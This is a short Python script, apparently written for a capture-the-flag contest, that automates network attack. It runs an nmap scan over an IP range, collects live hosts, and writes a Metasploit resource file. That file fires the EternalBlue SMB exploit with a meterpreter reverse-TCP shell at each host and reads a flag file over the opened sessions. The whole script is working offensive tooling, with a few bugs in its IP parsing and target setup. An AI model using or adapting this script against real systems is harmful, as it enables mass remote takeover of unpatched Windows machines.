#!/usr/bin/python3
#coding：utf-8
import os
import re

print('by lx')
Enter_ip = input("请输入你的ip段例如:192.168.1.0/24:"+"\n")
os.system("sudo nmap -sS -T5 {} >>scann.txt".format(Enter_ip))
print("扫描完成")
def log_read():
    with open("scann.txt", mode="r") as f:
        result = list(set(re.findall(r"\d{3}\.\d{3}\.\d{1,3}\.\d{1,3}", f.read())))

    result = "   ".join(result)
    return result

def ip_write_file(result):
    with open('ip.txt', 'w') as f:
        f.write(result)
    print("---存活IP---")
    os.system("cat ip.txt")
    print("\n")
def config_write_file(result):
    config = open('cs.rc', 'w')
    config.write('use exploit/windows/smb/ms17_010_eternalblue' + "\n")
    config.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp' + "\n")
    config.write('set LHOST eth0'+"\n")
    config.write('set RHOSTS ')
    attack = input('是否全部攻击,请输入y或者n:'+"\n")
    if attack == 'y':
        for ele in result.split("  "):
            config.write(ele)
    elif attack == 'n':
        Define_ip = input('请输入你要攻击的ip:'+"\n")
        config.write('set RHOSTS {}'.format(Define_ip))
    config.write("\n")
    config.write("exploit"+"\n")
    config.write("sessions -C 'cat C://flagvalue.txt'"+"\n")
    config.close()


def main():
    result = log_read()
    ip_write_file(result)
    config_write_file(result)
    os.system("chmod 777 cs.rc")
    print("正在调用msf开始攻击")
    mg = os.system('msfconsole -r cs.rc')
    f = open('cs.rc', 'w')
    f.close()


if __name__ == '__main__':
    main()
